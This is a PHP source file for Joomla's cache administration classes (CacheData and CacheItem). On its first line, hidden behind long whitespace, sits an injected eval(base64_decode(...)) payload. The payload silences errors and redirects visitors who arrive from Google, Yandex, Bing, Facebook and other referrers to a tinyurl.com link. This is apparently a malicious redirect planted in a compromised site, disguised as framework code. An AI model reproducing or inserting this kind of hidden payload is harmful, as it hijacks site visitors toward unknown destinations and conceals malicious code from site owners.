<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: cache.class.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	Cache
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant
 * to the GNU General Public License, and as distributed it includes or
 * is derivative of works licensed under the GNU General Public License or
 * other free or open source software licenses.
 * See COPYRIGHT.php for copyright notices and details.
 */

// no direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

/**
 * Class used to hold Cache data
 *
 * @package		Joomla
 * @subpackage	Cache
 * @since		1.5
 */
class CacheData extends JObject
{
	/**
	 * An Array of CacheItems indexed by cache group ID
	 *
	 * @access protected
	 * @var Array
	 */
	var $_items = null;

	/**
	 * The cache path
	 *
	 * @access protected
	 * @var String
	 */
	var $_path = null;

	/**
	 * Class constructor
	 *
	 * @access protected
	 */
	function __construct( $path )
	{
		$this->_path = $path;
		$this->_parse();
	}

	/**
	 * Parse $path for cache file groups. Any files identifided as cache are logged
	 * in a group and stored in $this->items.
	 *
	 * @access	private
	 * @param	String $path
	 */
	function _parse()
	{
		jimport('joomla.filesystem.folder');
		jimport('joomla.filesystem.file');
		$folders = JFolder::folders($this->_path);

		foreach ($folders as $folder)
		{
			$files = array();
			$files = JFolder::files($this->_path.DS.$folder);
			$this->_items[$folder] = new CacheItem( $folder );

			foreach ($files as $file)
			{
				$this->_items[$folder]->updateSize( filesize( $this->_path.DS.$folder.DS.$file )/ 1024 );
			}
		}
	}

	/**
	 * Get the number of current Cache Groups
	 *
	 * @access public
	 * @return int
	 */
	function getGroupCount()
	{
		return count($this->_items);
	}

	/**
	 * Retrun an Array containing a sub set of the total
	 * number of Cache Groups as defined by the params.
	 *
	 * @access public
	 * @param Int $start
	 * @param Int $limit
	 * @return Array
	 */
	function getRows( $start, $limit )
	{
		$i = 0;
		$rows = array();
		if (!is_array($this->_items)) {
			return null;
		}

		foreach ($this->_items as $item)
		{
			if ( (($i >= $start) && ($i < $start+$limit)) || ($limit == 0) ) {
				$rows[] = $item;
			}
			$i++;
		}
		return $rows;
	}

	/**
	 * Clean out a cache group as named by param.
	 * If no param is passed clean all cache groups.
	 *
	 * @param String $group
	 */
	function cleanCache( $group='' )
	{
		$cache =& JFactory::getCache('', 'callback', 'file');
		$cache->clean( $group );
	}

	function cleanCacheList( $array )
	{
		foreach ($array as $group) {
			$this->cleanCache( $group );
		}
	}
}

 /**
  * This Class is used by CacheData to store group cache data.
  *
  * @package		Joomla
  * @subpackage	Cache
  * @since		1.5
  */
class CacheItem
{
	var $group 	= "";
	var $size 	= 0;
	var $count 	= 0;

	function CacheItem ( $group )
	{
		$this->group = $group;
	}

	function updateSize( $size )
	{
		$this->size = number_format( $this->size + $size, 2 );
		$this->count++;
	}
}